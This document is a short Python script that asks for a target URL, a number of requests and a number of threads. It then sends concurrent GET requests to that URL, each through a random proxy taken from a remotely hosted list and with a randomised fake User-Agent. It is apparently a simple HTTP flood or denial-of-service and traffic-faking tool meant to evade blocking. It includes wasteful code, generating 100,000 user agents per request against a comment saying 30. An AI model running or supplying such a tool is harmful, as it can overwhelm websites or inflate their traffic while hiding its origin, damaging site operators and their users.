import requests
import random
import os
import time
from concurrent.futures import ThreadPoolExecutor
import threading
from fake_useragent import UserAgent

success_counter = 0
counter_lock = threading.Lock()

def show():
    os.system('clear')
    print("\033[1m\033[91m               hiii chk\033[0m")
    print("\n\n")

def get_proxies():
    try:
        # Fetch proxies from the provided URL
        proxy_url = "https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt"
        response = requests.get(proxy_url)
        if response.status_code == 200:
            # Extract proxies from the response
            proxies = response.text.strip().split('\n')
            return proxies
        else:
            print(f"Failed to fetch proxies from {proxy_url}. Status code: {response.status_code}")
            return None
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while fetching proxies: {e}")
        return None

proxies = get_proxies()

def send_request(url):
    global success_counter
    global proxies
    
    try:
        if not proxies:
            print("No proxies available.")
            return

        # Choose a random proxy from the list
        proxy = random.choice(proxies)
        proxy_dict = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }

        # Initialize UserAgent object
        ua = UserAgent()
        
        # Generate 30 random user agents
        user_agents = [ua.random for _ in range(100000)]
        
        # Choose a random User-Agent from the list
        user_agent = random.choice(user_agents)
        
        # Set the User-Agent header
        headers = {"User-Agent": user_agent}
        
        # Send GET request with the specified User-Agent and proxy
        response = requests.get(url, headers=headers, proxies=proxy_dict)
        
        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            with counter_lock:
                success_counter += 1
            print(f"\033[1;35m{success_counter} => Request to \033[1;37m{url} \033[1;34m with \033[1;33mUser-Agent \033[1;37m{user_agent} \033[1;34mand Proxy \033[1;37m{proxy} \033[0;32msuccessful\033[0m")
            # Process response data if needed
        else:
            print(f"Request to \033[0;31m{url} with User-Agent {user_agent} and Proxy {proxy} \033[0;31mfailed with status code: {response.status_code}\033[0m")
            
    except requests.exceptions.RequestException as e:
        print(f"\033[0mAn error occurred while sending request to \033[0;31m{url}\033[0m: {e}")

def main():
    show()
    try:
        # Define the URL
        url = input("\033[96mEnter target URL: ")
        
        # Number of times to send the request
        num_requests = int(input("\033[97mEnter number of requests: "))
        
        # Maximum number of workers
        max_workers = int(input("\033[94mEnter number of workers: "))
        
        if not proxies:
            print("No proxies available. Exiting.")
            return
        
        # Create a ThreadPoolExecutor
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit requests
            for _ in range(num_requests):
                executor.submit(send_request, url)
        
        # Print the total number of successful requests
        print(f"\033[0;33mTotal successful requests: {success_counter}\033[0m")
    
    except ValueError:
        print("Invalid input. Please enter a valid integer for number of requests and workers.")

if __name__ == "__main__":
    main()
